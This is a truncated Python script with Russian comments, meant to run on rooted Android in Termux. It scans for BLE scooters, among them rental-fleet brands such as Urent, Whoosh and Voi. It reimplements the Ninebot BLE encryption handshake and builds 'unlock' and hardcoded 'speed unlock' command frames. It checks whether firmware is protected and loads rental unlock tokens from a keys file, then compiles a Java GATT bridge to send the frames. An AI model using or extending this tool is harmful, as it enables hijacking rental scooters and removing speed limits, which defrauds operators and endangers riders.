#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
# scooter.py — BLE-самокаты, Android/Termux, root, pyjnius
#
# ТРЕБОВАНИЯ:
#   pip install pyjnius pycryptodome cryptography requests
#   pkg install openjdk-21 ecj dx curl unzip
#
# ROOT:
#   su -c "appops set com.termux BLUETOOTH_SCAN allow"
#   su -c "appops set com.termux BLUETOOTH_CONNECT allow"
#
# ЗАПУСК: python s.py
# =============================================================================

import os
import sys
import re
import time
import base64
import shutil
import queue
import hashlib
import threading
import subprocess
import traceback
import zipfile
import binascii
from datetime import datetime

import jnius_config

# -----------------------------------------------------------------------------
# КОНСТАНТЫ
# -----------------------------------------------------------------------------

APP_DIR = os.path.expanduser("~/.scooter")
JAR_PATH = os.path.join(APP_DIR, "GattBridge.jar")
JAVA_SRC = os.path.join(APP_DIR, "GattBridge.java")
CLASSES_DIR = os.path.join(APP_DIR, "classes")
DEX_DIR = os.path.join(APP_DIR, "dex")
ANDROID_JAR_PATH = os.path.join(APP_DIR, "android.jar")
ECJ_JAR_PATH = os.path.join(APP_DIR, "ecj.jar")
R8_JAR_PATH = os.path.join(APP_DIR, "r8.jar")

PLATFORM_ZIP_URL = (
    "https://dl.google.com/android/repository/platform-33_r02.zip"
)
ANDROID_JAR_DIRECT_URL = (
    "https://raw.githubusercontent.com/Reginer/aosp-android-jar/main/"
    "android-33/android.jar"
)
ECJ_JAR_URL = (
    "https://archive.eclipse.org/eclipse/downloads/drops4/"
    "R-4.12-201906051800/ecj-4.12.jar"
)
R8_JAR_URL = (
    "https://dl.google.com/dl/android/maven2/com/android/tools/r8/8.2.42/"
    "r8-8.2.42.jar"
)

ANDROID_JAR_CANDIDATES = [
    os.environ.get("ANDROID_JAR", ""),
    ANDROID_JAR_PATH,
    "/sdcard/android.jar",
    "/data/local/tmp/android.jar",
    "/storage/emulated/0/android.jar",
]

NUS_SERVICE = "6e400001-b5a3-f393-e0a9-e50e24dcca9e"
NUS_RX = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"
NUS_TX = "6e400003-b5a3-f393-e0a9-e50e24dcca9e"

BLE_NAME_HINTS = (
    "ninebot", "segway", "xiaomi", "m365", "mi ", "kugoo",
    "navee", "niu", "s.", "urent", "whoosh", "voi", "snsc", "max plus",
)

TIMEOUT_DEFAULT = 5.0

_JNIUS = {}


def jnius():
    if "mod" not in _JNIUS:
        import jnius
        _JNIUS["mod"] = jnius
        _JNIUS["autoclass"] = jnius.autoclass
        _JNIUS["cast"] = jnius.cast
    return _JNIUS


# -----------------------------------------------------------------------------
# 1. LOGGER
# -----------------------------------------------------------------------------

class Logger:
    RESET = "\033[0m"
    COLORS = {"DEBUG": "\033[90m", "INFO": "\033[32m",
              "WARN": "\033[33m", "ERROR": "\033[31m"}
    LEVELS = {"DEBUG": 10, "INFO": 20, "WARN": 30, "ERROR": 40}

    def __init__(self, level="DEBUG", log_path=None):
        self.level = level
        self.buffer = []
        self.log_path = log_path or os.path.join(
            os.getcwd(), f"scooter_log_{int(time.time())}.txt")
        self._fh = open(self.log_path, "w", encoding="utf-8")
        self.info(f"Лог открыт: {self.log_path}")

    def _should(self, level):
        return self.LEVELS[level] >= self.LEVELS[self.level]

    @staticmethod
    def hexdump(data):
        if data is None:
            return ""
        if isinstance(data, str):
            data = data.encode("utf-8", "replace")
        if isinstance(data, (bytearray, memoryview)):
            data = bytes(data)
        if isinstance(data, bytes):
            return " ".join(f"{b:02x}" for b in data)
        return str(data)

    def _write(self, level, msg, hex_dump=None):
        if not self._should(level):
            return
        ts = datetime.now().isoformat(timespec="milliseconds")
        tail = f" | hex: {self.hexdump(hex_dump)}" if hex_dump is not None else ""
        line = f"[{ts}] [{level}] {msg}{tail}"
        print(f"{self.COLORS.get(level, '')}{line}{self.RESET}")
        self.buffer.append(line)
        try:
            self._fh.write(line + "\n")
            self._fh.flush()
        except Exception:
            pass

    def debug(self, m, h=None): self._write("DEBUG", m, h)
    def info(self, m, h=None):  self._write("INFO", m, h)
    def warn(self, m, h=None):  self._write("WARN", m, h)
    def error(self, m, h=None): self._write("ERROR", m, h)

    def export(self):
        try:
            self._fh.write("\n=== END OF LOG ===\n")
            self._fh.close()
        except Exception:
            pass
        print(f"Лог сохранён: {self.log_path}")
        return self.log_path


# -----------------------------------------------------------------------------
# 2. PROTOCOL PARSER
# -----------------------------------------------------------------------------

class ProtocolParser:
    HEADER = b"\x5a\xa5"

    def __init__(self, logger):
        self.log = logger

    def build_frame(self, src=0x3E, dst=0x21, cmd=0x00, idx=0x00,
                    data=b"", with_csum=True):
        payload = bytes(data or b"")
        ln = 4 + len(payload)
        body = bytes([ln & 0xFF, src & 0x3F, dst & 0x3F,
                      cmd & 0xFF, idx & 0xFF]) + payload
        frame = self.HEADER + body
        if with_csum:
            csum = (~sum(body)) & 0xFFFF
            frame += bytes([csum & 0xFF, (csum >> 8) & 0xFF])
        self.log.debug("build_frame", frame)
        return frame

    def parse_frame(self, raw):
        if raw is None:
            return None
        buf = bytes(raw)
        if len(buf) < 9 or buf[0:2] != self.HEADER:
            self.log.debug("parse_frame: нет заголовка", buf[:4])
            return None
        ln = buf[2]
        if ln < 4:
            self.log.warn(f"parse_frame: len={ln} < 4")
            return None
        data_len = ln - 4
        expected = 2 + 1 + ln + 2
        if len(buf) < expected:
            self.log.debug(f"parse_frame: короткий ({len(buf)} < {expected})")
            return None
        src, dst, cmd, idx = buf[3], buf[4], buf[5], buf[6]
        data = buf[7:7 + data_len]
        recv = buf[7 + data_len] | (buf[8 + data_len] << 8)
        calc = (~sum(buf[2:7 + data_len])) & 0xFFFF
        if recv != calc:
            self.log.warn(
                f"parse_frame: csum mismatch "
                f"recv=0x{recv:04x} calc=0x{calc:04x}")
            return None
        return {"src": src, "dst": dst, "cmd": cmd, "idx": idx,
                "data": data, "raw": buf[:expected]}

    def build_info_request(self):
        return bytes.fromhex("3e215b00")

    def build_info_request_frame(self):
        return self.build_frame(src=0x3E, dst=0x21, cmd=0x5B,
                                idx=0x00, data=b"")

    def build_unlock(self):
        return self.build_frame(cmd=0x05, with_csum=False)

    def build_speed_unlock(self):
        return bytes.fromhex("5AA5004B4894E33A91E0327EC2")

    def check_version_protection(self, payload):
        if not payload:
            return {"protected": None, "drv": "unknown", "ble": "unknown"}
        b = bytes(payload)
        found = []
        for i in range(len(b) - 2):
            mj, mn, pt = b[i], b[i + 1], b[i + 2]
            if 1 <= mj <= 5 and mn <= 20 and pt <= 20:
                found.append((mj, mn, pt))
        drv = found[0] if found else None
        ble = found[1] if len(found) > 1 else None
        drv_s = f"{drv[0]}.{drv[1]}.{drv[2]}" if drv else "unknown"
        ble_s = f"{ble[0]}.{ble[1]}.{ble[2]}" if ble else "unknown"
        prot = False
        if drv:
            prot = prot or (drv[0] > 1 or (drv[0] == 1 and drv[1] > 7) or
                            (drv[0] == 1 and drv[1] == 7 and drv[2] > 0))
        if ble:
            prot = prot or (ble[0] > 1 or (ble[0] == 1 and ble[1] > 5) or
                            (ble[0] == 1 and ble[1] == 5 and ble[2] > 7))
        return {"protected": prot, "drv": drv_s, "ble": ble_s}


# -----------------------------------------------------------------------------
# 3. NINEBOT CRYPTO
# -----------------------------------------------------------------------------

class NinebotCrypto:
    FW_DATA = bytes([0x97, 0xCF, 0xB8, 0x02, 0x84, 0x41, 0x43, 0xDE,
                     0x56, 0x00, 0x2B, 0x3B, 0x34, 0x78, 0x0A, 0x5D])

    def __init__(self, name):
        from Crypto.Cipher import AES
        self._AES = AES
        self.name = name
        self._random_ble_data = bytearray(16)
        self._random_app_data = bytearray(16)
        self._sha1_key = bytearray(16)
        self._msg_it = 0
        self._calc_sha1_key(name.encode("ascii", "ignore"), self.FW_DATA)

    def _calc_sha1_key(self, name_bytes, data_bytes):
        h = hashlib.sha1()
        h.update(name_bytes)
        h.update(data_bytes)
        self._sha1_key = bytearray(h.digest()[:16])

    def _crypto_first(self, data):
        key = bytes(self._sha1_key)
        n = len(data)
        return bytearray(data[i] ^ key[i % 16] for i in range(n))

    def _crypto_next(self, data, msg_it):
        cipher = self._AES.new(bytes(self._sha1_key), self._AES.MODE_ECB)
        ctr = bytearray(16)
        ctr[0] = (msg_it >> 24) & 0xFF
        ctr[1] = (msg_it >> 16) & 0xFF
        ctr[2] = (msg_it >> 8) & 0xFF
        ctr[3] = msg_it & 0xFF
        keystream = bytearray()
        for _ in range(0, len(data), 16):
            keystream.extend(cipher.encrypt(bytes(ctr)))
            for j in range(15, -1, -1):
                ctr[j] = (ctr[j] + 1) & 0xFF
                if ctr[j] != 0:
                    break
        return bytearray(data[i] ^ keystream[i] for i in range(len(data)))

    @staticmethod
    def _crc16(data):
        crc = 0xFFFF
        for b in data:
            crc ^= (b << 8)
            for _ in range(8):
                if crc & 0x8000:
                    crc = ((crc << 1) ^ 0x1021) & 0xFFFF
                else:
                    crc = (crc << 1) & 0xFFFF
        return crc

    @staticmethod
    def _crc32(data):
        return binascii.crc32(bytes(data)) & 0xFFFFFFFF

    def _calc_crc_first_msg(self, payload):
        crc = self._crc16(payload)
        return bytes([crc & 0xFF, (crc >> 8) & 0xFF])

    def _calc_crc_next_msg(self, data, msg_it):
        extra = bytes([(msg_it >> 24) & 0xFF, (msg_it >> 16) & 0xFF,
                       (msg_it >> 8) & 0xFF, msg_it & 0xFF])
        crc = self._crc32(bytes(data) + extra)
        return bytes([(crc >> 24) & 0xFF, (crc >> 16) & 0xFF,
                      (crc >> 8) & 0xFF, crc & 0xFF])

    def encrypt(self, data):
        data = bytes(data)
        if (len(data) >= 9 and data[0] == 0x5A and data[1] == 0xA5
                and data[2] >= 4 and len(data) == 3 + data[2] + 2):
            data = data[:3 + data[2]]
        if len(data) < 3:
            return data
        header = data[:3]
        payload = bytearray(data[3:])
        if self._msg_it == 0:
            crc = self._calc_crc_first_msg(payload)
            enc_payload = self._crypto_first(payload)
            out = header + bytes(enc_payload) + bytes(
                [0, 0, crc[0], crc[1], 0, 0])
            self._msg_it += 1
            return out
        self._msg_it += 1
        crc = self._calc_crc_next_msg(data, self._msg_it)
        enc_payload = self._crypto_next(payload, self._msg_it)
        out = header + bytes(enc_payload) + bytes([
            crc[0], crc[1], crc[2], crc[3],
            (self._msg_it >> 8) & 0xFF, self._msg_it & 0xFF,
        ])
        if (len(data) >= 23 and data[0] == 0x5A and data[1] == 0xA5
                and data[2] == 0x10 and data[3] == 0x3E and data[4] == 0x21
                and data[5] == 0x5C and data[6] == 0x00):
            self._random_app_data[:] = data[7:23]
        return out

    def decrypt(self, data):
        data = bytes(data)
        if len(data) < 9:
            return data
        if data[0] != 0x5A or data[1] != 0xA5:
            return data
        header = data[:3]
        payload_len = len(data) - 9
        if payload_len < 0:
            return data
        enc_payload = bytearray(data[3:3 + payload_len])
        trailer = data[3 + payload_len:3 + payload_len + 6]
        if len(trailer) < 6:
            return data
        new_msg_it = self._msg_it
        msg_hi = trailer[4]
        msg_lo = trailer[5]
        if (new_msg_it & 0x8000) > 0 and (msg_hi >> 7) == 0:
            new_msg_it += 0x10000
        new_msg_it = (new_msg_it & 0xFFFF0000) + (msg_hi << 8) + msg_lo
        if new_msg_it == 0:
            dec_payload = self._crypto_first(enc_payload)
            out = header + bytes(dec_payload)
            if (len(out) >= 23 and out[0] == 0x5A and out[1] == 0xA5
                    and out[2] == 0x1E and out[3] == 0x21 and out[4] == 0x3E
                    and out[5] == 0x5B):
                self._random_ble_data[:] = out[7:23]
                self._calc_sha1_key(self.name.encode("ascii", "ignore"),
                                    self._random_ble_data)
            return out
        if new_msg_it > 0 and new_msg_it > self._msg_it:
            dec_payload = self._crypto_next(enc_payload, new_msg_it)
            out = header + bytes(dec_payload)
            if (len(out) >= 7 and out[0] == 0x5A and out[1] == 0xA5
                    and out[2] == 0x00 and out[3] == 0x21 and out[4] == 0x3E
                    and out[5] == 0x5C and out[6] == 0x01):
                self._calc_sha1_key(bytes(self._random_app_data),
                                    bytes(self._random_ble_data))
            self._msg_it = new_msg_it
            return out
        return data

    def reset(self):
        self._random_ble_data = bytearray(16)
        self._random_app_data = bytearray(16)
        self._msg_it = 0
        self._calc_sha1_key(self.name.encode("ascii", "ignore"), self.FW_DATA)


# -----------------------------------------------------------------------------
# 4. SCOOTER CRYPTO
# -----------------------------------------------------------------------------

class ScooterCrypto:
    def __init__(self, logger):
        self.log = logger

    def generate_ecdh_keypair(self):
        from cryptography.hazmat.primitives.asymmetric import ec
        from cryptography.hazmat.primitives import serialization
        priv = ec.generate_private_key(ec.SECP256R1())
        pub = priv.public_key().public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint)
        return priv, pub

    def ecdh_shared_secret(self, priv, peer_pub_bytes):
        from cryptography.hazmat.primitives.asymmetric import ec
        peer = ec.EllipticCurvePublicKey.from_encoded_point(
            ec.SECP256R1(), bytes(peer_pub_bytes))
        return priv.exchange(ec.ECDH(), peer)

    def hkdf_sha256(self, shared, info=b"", length=32, salt=None):
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
        return HKDF(algorithm=hashes.SHA256(), length=length,
                    salt=salt or b"\x00" * 32, info=info).derive(shared)

    def aes_ccm_encrypt(self, key, nonce, plaintext, aad=b""):
        from Crypto.Cipher import AES
        c = AES.new(bytes(key), AES.MODE_CCM, nonce=bytes(nonce), mac_len=16)
        c.update(bytes(aad or b""))
        ct, tag = c.encrypt_and_digest(bytes(plaintext))
        return ct + tag

    def aes_ccm_decrypt(self, key, nonce, ciphertext_with_tag, aad=b""):
        from Crypto.Cipher import AES
        ct, tag = ciphertext_with_tag[:-16], ciphertext_with_tag[-16:]
        c = AES.new(bytes(key), AES.MODE_CCM, nonce=bytes(nonce), mac_len=16)
        c.update(bytes(aad or b""))
        return c.decrypt_and_verify(ct, tag)


# -----------------------------------------------------------------------------
# 5. KEY MANAGER
# -----------------------------------------------------------------------------

DEFAULT_KEYS_TXT = """# keys.txt — база токенов и ключей

# Модель (используется в NinebotCrypto: SHA1(model || _fw_data))
#model:Ninebot ES4

# Перепрошивка разрешена? true/false
#allow_flash:false

# Urent-токены (формат: 8 символов - URENT)
# A7mK9pQ2 - URENT

# Переопределение UUID Urent (если отличаются от FFE0/FFE1)
#urent_service:0000ffe0-0000-1000-8000-00805f9b34fb
#urent_char:0000ffe1-0000-1000-8000-00805f9b34fb
"""


class KeyManager:
    URENT_RE = re.compile(r"^\s*([A-Za-z0-9]{8})\s*-\s*URENT\s*$", re.IGNORECASE)

    def __init__(self, logger):
        self.log = logger
        self.keys = []
        self.urent_tokens = []
        self.hex_keys = []
        self.payloads = []
        self.directives = {}

    def load(self, path="keys.txt"):
        if not os.path.exists(path):
            self.log.info(f"{path} не найден — создаю пример")
            try:
                with open(path, "w", encoding="utf-8") as fh:
                    fh.write(DEFAULT_KEYS_TXT)
            except Exception as e:
                self.log.error(f"не удалось создать {path}: {e}")

        if not os.path.exists(path):
            return self

        self.log.info(f"Загрузка ключей: {path}")
        with open(path, "r", encoding="utf-8") as fh:
            for lineno, raw in enumerate(fh, 1):
                line = raw.strip()
                if not line:
                    continue
                if line.startswith("#"):
                    if ":" in line:
                        k, _, v = line[1:].partition(":")
                        self.directives[k.strip()] = v.strip()
                    continue
                key = self._parse_line(line, lineno)
                if key:
                    self.keys.append(key)
                    bucket = {"urent_token": "urent_tokens",
                              "hex": "hex_keys",
                              "base64": "payloads",
                              "ascii": "payloads"}[key["type"]]
                    getattr(self, bucket).append(key)
        self.log.info(
            f"Ключей: {len(self.keys)} | urent={len(self.urent_tokens)} | "
            f"директив={len(self.directives)}")
        return self

    def _parse_line(self, line, lineno):
        m = self.URENT_RE.match(line)
        if m:
            token = m.group(1)
            return {"type": "urent_token", "raw": token,
                    "bytes": token.encode("ascii"), "line": lineno}

        low = line.lower()
        try:
            if low.startswith("hex:"):
                h = re.sub(r"\s+", "", line[4:])
                if len(h) % 2 or not re.fullmatch(r"[0-9a-fA-F]+", h):
                    raise ValueError("битый hex")
                return {"type": "hex", "raw": line[4:],
                        "bytes": bytes.fromhex(h), "line": lineno}
            if low.startswith("base64:"):
                b = base64.b64decode(line[7:], validate=True)
                return {"type": "base64", "raw": line[7:],
                        "bytes": b, "line": lineno}
            if low.startswith("ascii:"):
                return {"type": "ascii", "raw": line[6:],
                        "bytes": line[6:].encode("ascii"), "line": lineno}
        except Exception as e:
            self.log.error(f"строка {lineno}: {e}", line)
            return None

        if re.fullmatch(r"[0-9a-fA-F]+", line) and len(line) % 2 == 0:
            return {"type": "hex", "raw": line,
                    "bytes": bytes.fromhex(line), "line": lineno}
        return {"type": "ascii", "raw": line,
                "bytes": line.encode("utf-8", "replace"), "line": lineno}


# -----------------------------------------------------------------------------
# 6. JAVA BRIDGE SOURCE
# -----------------------------------------------------------------------------

GATT_BRIDGE_JAVA = r'''
package com.scooter.bridge;

import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import java.util.UUID;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

public class GattBridge extends BluetoothGattCallback {
    public interface Listener {
        void onConnected(); void onDisconnected(); void onServicesDiscovered();
        void onData(byte[] data); void onWriteComplete(); void onError(String message);
    }
    public static class NoopListener implements Listener {
        public void onConnected() {} public void onDisconnected() {}
        public void onServicesDiscovered() {} public void onData(byte[] data) {}
        public void onWriteComplete() {} public void onError(String message) {}
    }
    private final Listener listener;
    public final LinkedBlockingQueue<byte[]> notifyQueue = new LinkedBlockingQueue<byte[]>();
    public BluetoothGatt gatt; public BluetoothGattService nusService;
    public BluetoothGattService urentService; public BluetoothGattCharacteristic txChar;
    public BluetoothGattCharacteristic rxChar; public BluetoothGattCharacteristic urentChar;
    public volatile boolean connected = false; public volatile boolean servicesReady = false;
    public volatile String lastError = null;
    public GattBridge(Listener l) { this.listener = (l != null) ? l : new NoopListener(); }
    public GattBridge() { this(new NoopListener()); }
    @Override public void onConnectionStateChange(BluetoothGatt g, int status, int newState) {
        this.gatt = g;
        if (newState == 2) { connected = true; listener.onConnected(); g.discoverServices(); }
        else if (newState == 0) { connected = false; servicesReady = false; listener.onDisconnected(); }
    }
    @Override public void onServicesDiscovered(BluetoothGatt g, int status) {
        if (status != 0) { lastError = "Service discovery failed: " + status; listener.onError(lastError); return; }
        UUID NUS = UUID.fromString("6e400001-b5a3-f393-e0a9-e50e24dcca9e");
        UUID TX  = UUID.fromString("6e400002-b5a3-f393-e0a9-e50e24dcca9e");
        UUID RX  = UUID.fromString("6e400003-b5a3-f393-e0a9-e50e24dcca9e");
        nusService = g.getService(NUS);
        if (nusService != null) { txChar = nusService.getCharacteristic(TX); rxChar = nusService.getCharacteristic(RX); }
        else { lastError = "NUS service not found"; listener.onError(lastError); }
        if (rxChar != null) {
            g.setCharacteristicNotification(rxChar, true);
            BluetoothGattDescriptor desc = rxChar.getDescriptor(UUID.fromString("00002902-0000-1000-8000-00805f9b34fb"));
            if (desc != null) { desc.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE); g.writeDescriptor(desc); }
        }
        urentService = g.getService(UUID.fromString("0000ffe0-0000-1000-8000-00805f9b34fb"));
        if (urentService != null) { urentChar = urentService.getCharacteristic(UUID.fromString("0000ffe1-0000-1000-8000-00805f9b34fb")); }
        servicesReady = true; listener.onServicesDiscovered();
    }
    @Override public void onCharacteristicChanged(BluetoothGatt g, BluetoothGattCharacteristic c) {
        byte[] val = c.getValue(); if (val != null) { notifyQueue.offer(val); listener.onData(val); }
    }
    @Override public void onCharacteristicWrite(BluetoothGatt g, BluetoothGattCharacteristic c, int status) {
        if (status == 0) listener.onWriteComplete();
        else { lastError = "Write failed: " + status; listener.onError(lastError); }
    }
    public boolean write(byte[] data) {
        if (gatt == null || txChar == null) return false;
        txChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_NO_RESPONSE);
        txChar.setValue(data); return gatt.writeCharacteristic(txChar);
    }
    public boolean writeUrent(byte[] data) {
        if (gatt == null || urentChar == null) return false;
        urentChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
        urentChar.setValue(data); return gatt.writeCharacteristic(urentChar);
    }
    public void disconnect() {
        if (gatt != null) { try { gatt.disconnect(); } catch (Throwable t) {} try { gatt.close(); } catch (Throwable t) {} }
        connected = false; servicesReady = false;
    }
    public byte[] readNotify(long timeoutMs) {
        try { return notifyQueue.poll(timeoutMs, TimeUnit.MILLISECONDS); } catch (Exception e) { return null; }
    }
    public void clearQueue() { notifyQueue.clear(); }
}
'''


# -----------------------------------------------------------------------------
# 7. UTIL
# -----------------------------------------------------------------------------

def _which(name):
    return shutil.which(name)


def _run(cmd, logger, cwd=None):
    logger.debug("exec: " + " ".join(cmd))
    try:
        p = subprocess.run(cmd, cwd=cwd, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, text=True, timeout=600)
    except subprocess.TimeoutExpired:
        logger.error("exec timeout")
        return 1, ""
    if p.stdout:
        for line in p.stdout.strip().splitlines()[-30:]:
            logger.debug("  " + line)
    return p.returncode, p.stdout


def _download(url, dest, logger, min_size=1024 * 1024):
    if os.path.isfile(dest) and os.path.getsize(dest) >= min_size:
        logger.info(f"уже есть: {dest} ({os.path.getsize(dest)} B)")
        return True
    logger.info(f"скачивание: {url}")
    try:
        import requests
        r = requests.get(url, stream=True, timeout=120, allow_redirects=True)
        r.raise_for_status()
        tmp = dest + ".part"
        total = 0
        with open(tmp, "wb") as fh:
            for chunk in r.iter_content(65536):
                if chunk:
                    fh.write(chunk)
                    total += len(chunk)
        if total < min_size:
            os.remove(tmp)
            logger.error(f"файл слишком мал: {total} B (нужно {min_size})")
            return False
        os.replace(tmp, dest)
        logger.info(f"скачано: {dest} ({os.path.getsize(dest)} B)")
        return True
    except Exception as e:
        logger.error(f"download failed: {e}")
        return False


def _find_android_jar(logger):
    for p in ANDROID_JAR_CANDIDATES:
        if p and os.path.isfile(p) and os.path.getsize(p) > 1024 * 1024:
            logger.info(f"android.jar: {p}")
            return p
    return None


def _validate_android_jar(path, logger):
    if not os.path.isfile(path):
        logger.error(f"android.jar: файла нет: {path}")
        return False
    size = os.path.getsize(path)
    if size < 10 * 1024 * 1024:
        logger.error(f"android.jar: размер {size} B < 10 МБ")
        try: os.remove(path)
        except OSError: pass
        return False
    if not zipfile.is_zipfile(path):
        logger.error("android.jar: не ZIP")
        try: os.remove(path)
        except OSError: pass
        return False
    try:
        with zipfile.ZipFile(path) as zf:
            names = set(zf.namelist())
        if "android/bluetooth/BluetoothGatt.class" not in names:
            logger.error("android.jar: внутри нет BluetoothGatt.class")
            return False
        logger.info(f"android.jar: OK, API 33, {size // (1024 * 1024)} МБ")
        return True
    except Exception as e:
        logger.error(f"android.jar: ZIP-ошибка: {e}")
        return False


def _get_android_jar(logger):
    dest = os.path.join(APP_DIR, "android.jar")
    if _download(ANDROID_JAR_DIRECT_URL, dest, logger, min_size=10 * 1024 * 1024):
        if _validate_android_jar(dest, logger):
            return dest
    zip_dest = os.path.join(APP_DIR, "platform-33.zip")
    logger.info("platform-33_r02.zip (~200+ МБ). это может занять время.")
    if not _download(PLATFORM_ZIP_URL, zip_dest, logger,
                     min_size=100 * 1024 * 1024):
        return None
    try:
        with zipfile.ZipFile(zip_dest) as zf:
            target = None
            for name in zf.namelist():
                if name.endswith("android-33/android.jar"):
                    target = name
                    break
            if target is None:
                logger.error("в zip нет android-33/android.jar")
                return None
            with zf.open(target) as src, open(dest, "wb") as out:
                shutil.copyfileobj(src, out)
        os.remove(zip_dest)
        if _validate_android_jar(dest, logger):
            return dest
    except Exception as e:
        logger.error(f"extract: {e}")
    return None


def _get_compiler(logger):
    ecj_bin = _which("ecj")
    if ecj_bin:
        logger.info(f"ecj: {ecj_bin}")
        return [ecj_bin], "ecj"
    javac_bin = _which("javac")
    if javac_bin:
        logger.info(f"javac: {javac_bin}")
        return [javac_bin, "--release", "8"], "javac"
    if _download(ECJ_JAR_URL, ECJ_JAR_PATH, logger, min_size=1024 * 1024):
        logger.info(f"ecj.jar: {ECJ_JAR_PATH}")
        return ["java", "-jar", ECJ_JAR_PATH], "ecj.jar"
    return None, None


def _get_dexer(logger):
    d8_bin = _which("d8")
    if d8_bin:
        logger.info(f"d8: {d8_bin}")
        return [d8_bin], "d8"
    dx_bin = _which("dx")
    if dx_bin:
        logger.info(f"dx: {dx_bin}")
        return [dx_bin], "dx"
    if _download(R8_JAR_URL, R8_JAR_PATH, logger, min_size=1024 * 1024):
        logger.info(f"r8.jar: {R8_JAR_PATH}")
        return ["java", "-cp", R8_JAR_PATH, "com.android.tools.r8.D8"], "r8.jar"
    return None, None


def setup_java_bridge(logger):
    os.makedirs(APP_DIR, exist_ok=True)

    # ФИКС 2: Проверка целостности существующего jar перед загрузкой
    if os.path.isfile(JAR_PATH):
        try:
            with zipfile.ZipFile(JAR_PATH) as zf:
                if "classes.dex" not in zf.namelist():
                    raise ValueError("no classes.dex")
            logger.info(f"мостик уже собран: {JAR_PATH}")
            jnius_config.add_classpath(JAR_PATH)
            return True
        except Exception:
            logger.warn(f"битый jar {JAR_PATH} — пересобираю")
            try: os.remove(JAR_PATH)
            except OSError: pass

    android_jar = _find_android_jar(logger)
    if not android_jar:
        android_jar = _get_android_jar(logger)
    if not android_jar:
        logger.error("android.jar недоступен.")
        return False
    if not _validate_android_jar(android_jar, logger):
        return False

    with open(JAVA_SRC, "w", encoding="utf-8") as fh:
        fh.write(GATT_BRIDGE_JAVA)

    cc, cname = _get_compiler(logger)
    if not cc:
        logger.error("Нет компилятора Java (ecj/javac).")
        return False
    logger.info(f"компилятор: {cname}")

    shutil.rmtree(CLASSES_DIR, ignore_errors=True)
    os.makedirs(CLASSES_DIR, exist_ok=True)

    cmd = cc + ["-cp", android_jar, "-d", CLASSES_DIR, JAVA_SRC]
    rc, out = _run(cmd, logger)
    if rc != 0:
        logger.error("компиляция не прошла.", out)
        return False

    class_files = []
    for root, _, files in os.walk(CLASSES_DIR):
        for f in files:
            if f.endswith(".class"):
                class_files.append(os.path.join(root, f))
    if not class_files:
        logger.error("нет .class")
        return False
    logger.info(f".class: {len(class_files)}")

    dc, dname = _get_dexer(logger)
    if not dc:
        logger.error("нет d8/dx/r8. Установи pkg install dx или положи r8.jar вручную.")
        return False
    logger.info(f"dexer: {dname}")

    shutil.rmtree(DEX_DIR, ignore_errors=True)
    os.makedirs(DEX_DIR, exist_ok=True)

    # ФИКС 1: Передаем CLASSES_DIR целиком, чтобы dx не ругался на пути
    if dname == "dx":
        cmd = dc + ["--dex", "--output",
                    os.path.join(DEX_DIR, "classes.dex"), CLASSES_DIR]
    else:
        cmd = dc + ["--lib", android_jar, "--output", DEX_DIR] + class_files

    rc, out = _run(cmd, logger)
    if rc != 0:
        logger.error("dex не прошёл.", out)
        return False

    dex_files = [os.path.join(DEX_DIR, f) for f in os.listdir(DEX_DIR)
                 if f.endswith(".dex")]
    if not dex_files:
        logger.error("нет .dex")
        return False

    with zipfile.ZipFile(JAR_PATH, "w", zipfile.ZIP_DEFLATED) as zf:
        for df in dex_files:
            zf.write(df, arcname=os.path.basename(df))

    logger.info(f"мостик собран: {JAR_PATH} ({os.path.getsize(JAR_PATH)} B)")
    jnius_config.add_classpath(JAR_PATH)
    return True


# -----------------------------------------------------------------------------
# 8. SCAN CALLBACK
# -----------------------------------------------------------------------------

def build_scan_callback(on_device):
    from jnius import PythonJavaClass, java_method

    class _ScanCB(PythonJavaClass):
        __javainterfaces__ = ["android.bluetooth.BluetoothAdapter$LeScanCallback"]
        __javacontext__ = "app"

        @java_method("(Landroid/bluetooth/BluetoothDevice;I[B)V")
        def onLeScan(self, device, rssi, scan_record):
            try:
                on_device(device, int(rssi))
            except Exception:
                traceback.print_exc()

    return _ScanCB()


# -----------------------------------------------------------------------------
# 9. ANDROID BLE MANAGER
# -----------------------------------------------------------------------------

class AndroidBleManager:
    def __init__(self, logger):
        self.log = logger
        self.adapter = None
        self.context = None
        self.bridge = None
        self.device = None
        self.scan_cb = None
        self.discovered = {}
        self._q = queue.Queue()
        self._reader_thread = None
        self._reader_stop = False
        self._last_mac = None
        self._boot()

    def _boot(self):
        J = jnius()
        autoclass = J["autoclass"]
        jexc = J["mod"].JavaException

        try:
            ActivityThread = autoclass("android.app.ActivityThread")
            app = ActivityThread.currentApplication()
            if app is not None:
                ctx = app.getApplicationContext()
                if ctx is not None:
                    self.context = ctx
                    self.log.info("Context через ActivityThread")
        except jexc as e:
            self.log.debug(f"ActivityThread: {e}")

        if self.context is None:
            try:
                AppGlobals = autoclass("android.app.AppGlobals")
                app = AppGlobals.getInitialApplication()
                if app is not None:
                    ctx = app.getApplicationContext()
                    if ctx is not None:
                        self.context = ctx
                        self.log.info("Context через AppGlobals")
            except jexc as e:
                self.log.debug(f"AppGlobals: {e}")

        if self.context is None:
            self.log.warn("[WARN] Контекст не получен, GATT будет недоступен.")

        try:
            BluetoothAdapter = autoclass("android.bluetooth.BluetoothAdapter")
            self.adapter = BluetoothAdapter.getDefaultAdapter()
        except jexc as e:
            self.log.error(f"BluetoothAdapter: {e}")
            self.adapter = None

        if self.adapter is not None:
            try:
                self.log.info(
                    f"Адаптер: {self.adapter.getName()} "
                    f"включён={self.adapter.isEnabled()}")
            except jexc:
                pass

    def check_root_permissions(self):
        if _which("su") is None:
            self.log.warn("su не найден")
            return False
        ok = True
        for perm in ("BLUETOOTH_SCAN", "BLUETOOTH_CONNECT"):
            rc, _ = _run(["su", "-c",
                          f"appops set com.termux {perm} allow"], self.log)
            if rc != 0:
